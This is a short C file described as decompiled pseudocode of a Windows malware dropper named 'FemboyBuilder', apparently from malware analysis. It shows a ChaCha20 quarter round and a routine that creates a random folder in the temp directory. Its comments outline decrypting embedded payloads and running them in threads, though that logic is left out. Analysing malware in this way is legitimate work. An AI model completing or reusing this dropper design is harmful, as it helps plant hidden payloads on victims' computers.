/*
 * FemboyBuilder - Cleaned Reconstruction
 * Note: This is decompiled pseudocode, not original source. Not guaranteed to compile.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ChaCha20-style quarter round
static void chacha_quarter_round(uint32_t *state, int a, int b, int c, int d) {
    state[a] += state[b];
    state[d] ^= state[a];
    state[d] = (state[d] << 16) | (state[d] >> 16);
    
    state[c] += state[d];
    state[b] ^= state[c];
    state[b] = (state[b] << 12) | (state[b] >> 20);
    
    state[a] += state[b];
    state[d] ^= state[a];
    state[d] = (state[d] << 8) | (state[d] >> 24);
    
    state[c] += state[d];
    state[b] ^= state[c];
    state[b] = (state[b] << 7) | (state[b] >> 25);
}

// Main dropper logic
void DropperMain(void) {
    WCHAR tempPath[MAX_PATH];
    WCHAR dropDir[MAX_PATH];
    DWORD pathLen;
    DWORD tick;
    int i;
    
    // Get temp directory
    pathLen = GetTempPathW(MAX_PATH, tempPath);
    if (pathLen == 0) return;
    
    // Generate random hex directory name
    tick = GetTickCount();
    wcscpy_s(dropDir, MAX_PATH, tempPath);
    // Append random hex chars based on tick
    for (i = 0; i < 8; i++) {
        wchar_t hexChar = L"0123456789ABCDEF"[tick & 0xF];
        wchar_t hexStr[2] = {hexChar, L'\0'};
        wcscat_s(dropDir, MAX_PATH, hexStr);
        tick = (tick >> 4) + i;
    }
    wcscat_s(dropDir, MAX_PATH, L"\\");
    
    // Create drop directory
    CreateDirectoryW(dropDir, NULL);
    
    // Decrypt and extract payloads from embedded resources
    // [Payload decryption logic - ChaCha20 variant]
    // Files written to dropDir and executed via threads
    
    // Keep alive
    while (1) {
        Sleep(1000);
    }
}

void WinMain_CRT(void) {
    DropperMain();
    RtlExitUserProcess(0);
}

int main(void) {
    WinMain_CRT();
    return 0;
}
